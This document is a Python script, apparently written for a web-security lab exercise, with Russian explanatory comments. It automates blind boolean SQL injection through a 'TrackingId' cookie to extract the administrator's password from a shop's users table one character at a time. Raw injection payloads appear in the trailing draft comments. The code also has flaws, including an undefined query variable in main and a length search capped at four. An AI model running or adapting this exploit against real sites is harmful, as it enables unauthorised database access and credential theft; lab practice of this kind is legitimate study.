import sys
import logging
import urllib3
import string

import requests

import utils
from shop import Shop

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}] [{name}] {message}",
    style = "{",
    datefmt="%H:%M:%S",
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
"""
IPython (англ. Interactive Python)
через него запустили скрипт
import string
string.printable
"""
#что в итоге нам выдало: 
#Out[2]: '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c' 
AVAIL_CHARS = string.printable 
#и переменная avail_char (доступные символы хранит в себе подобный response)
def format_length_query(inner_query, length):
    return f"xyz' or (select length(({inner_query}))={length})-- "


def format_char_query(inner_query, index, char):
    return f"xyz' or (Select substring(({inner_query}), {index}, 1)=chr({char}))-- "


def is_true(resp):
    if "Welcome back" in resp.text:
        return True
    return False


def format_request(url, outer_query):
    cookies = {
        "TrackingId": outer_query,
    }    
    request = requests.Request("GET", url, cookies=cookies)
    prepped = request.prepare()
    return prepped

#here
def determine_response_length(inner_query, url, no_proxy=False):
    log.info("determinging response length")
    sess = requests.Session()
    for i in range(1, 5):
        outer_query = format_length_query(inner_query, i)
        prepped = format_request(url, outer_query)
        if no_proxy:
            resp = sess.send(prepped)
        else:
            resp = sess.send(prepped, proxies=utils.PROXIES, verify=False)
        if is_true(resp):
            response_length = i
            log.info(f"Length of query response is {response_length}")
            return i


def determine_response_char(inner_query, index, url, no_proxy=False):
    """
    chars = [ord(x) for x in AVAIL_CHARS]
    Это генератор списка (list comprehension), который:

    Проходит по каждому символу x из строки AVAIL_CHARS.
    Преобразует этот символ в его ASCII-код с помощью ord(x).
    Собирает все ASCII-коды в новый список.
    """
    sess = requests.Session()
    chars = [ord(x) for x in AVAIL_CHARS]
    for x in chars:
        outer_query = format_char_query(inner_query, index, x)
        prepped = format_request(url, outer_query)
        if no_proxy:
            resp = sess.send(prepped)
        else:
            resp = sess.send(prepped, proxies=utils.PROXIES, verify=False)
        if is_true(resp):
            response_char = chr(x)
            return response_char


def get_response_string(inner_query, url, no_proxy):
    response_chars = []
    response_lenght = determine_response_length(inner_query, url, no_proxy)
    for i in range(1, response_lenght + 1):
        response_chars.append(determine_response_char(inner_query, i, url, no_proxy))
    return "".join(response_chars)


def main(args):
    sess = requests.Session()
    shop = Shop(args.url, args.no_proxy, sess)
    get_response_string(inner_query, shop.base_url, shop.no_proxy)

if __name__ == "__main__":
    args = utils.parse_args(sys.argv)
    main(args)
#------------------------------------------------------------------------------------------
#draft

#xyz' and (select 'a' from users where username = 'administrator' and length(password > 1)) = 'a'-- 
        
#xyz' or (select length('aaaa')=4)--       //true its return text "welcmoeback"

#xyz' or (select substring('abcd', 1,1) = 'a')--             // the same response (true)
# and botta my own builded payload:  xyz' or substring((select password from users where username = 'administrator')1,1) = '{char}'

   
    
"""
select password from users where username = 'administsrator'
inner query


return f"xyz' or substring(({inner_query}), {index},1) = '{char}'-- "
"""    
  